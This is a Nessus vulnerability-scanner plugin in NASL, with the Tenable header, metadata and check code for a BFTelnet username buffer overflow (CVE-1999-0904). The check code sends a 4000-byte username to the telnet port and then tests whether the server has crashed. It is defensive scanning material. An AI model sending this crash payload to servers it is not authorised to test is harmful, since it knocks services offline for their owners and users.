#
# (C) Tenable Network Security, Inc.
#

#
# See also:
# Subject: IBM Infoprint Remote Management Simple DoS 
# Date: Fri, 25 Oct 2002 12:19:23 +0300
# From: "Toni Lassila" <toni.lassila@mc-europe.com>
# To: bugtraq@securityfocus.com
#


include("compat.inc");


if(description)
{
 script_id(10026);
 script_version ("$Revision: 1.21 $");

 script_cve_id("CVE-1999-0904");
 script_bugtraq_id(771);
 script_xref(name:"OSVDB", value:"1136");

 script_name(english:"BFTelnet Username Handling Remote Overflow DoS");
 script_summary(english:"crashes the remote telnet server");
 
 script_set_attribute(
   attribute:"synopsis",
   value:"The remote telnet server has a remote buffer overflow vulnerability."
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "It was possibly to crash the remote telnet server by sending a very\n",
     "long user name.  A remote attacker could exploit this to crash the\n",
     "server, or possibly execute arbitrary code."
   )
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://archives.neohapsis.com/archives/ntbugtraq/1999-q3/0343.html"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Upgrade to the latest version of this telnet server."
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C"
 );
 script_end_attributes();

 script_category(ACT_DENIAL);
 script_family(english:"Windows");

 script_copyright(english:"This script is Copyright (C) 1999-2009 Tenable Network Security, Inc.");

 script_require_ports("Services/telnet", 23);
 script_dependencies("find_service1.nasl");

 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include('telnet_func.inc');

if (report_paranoia < 2) exit(0);

port = get_kb_item("Services/telnet");
if(!port)port = 23;
if (get_port_state(port))
{
 soc = open_sock_tcp(port);

 if (soc)
 {
   banner = telnet_negotiate(socket:soc);
   data = string(crap(4000), "\r\n");
   send(socket:soc, data:data);
   close(soc);
   
   soc2 = NULL;
   for (i = 0; i < 3 && ! soc2; i ++)
   {
     sleep(i);
     soc2 = open_sock_tcp(port);
   }
   if(!soc2)security_hole(port);
 }
}
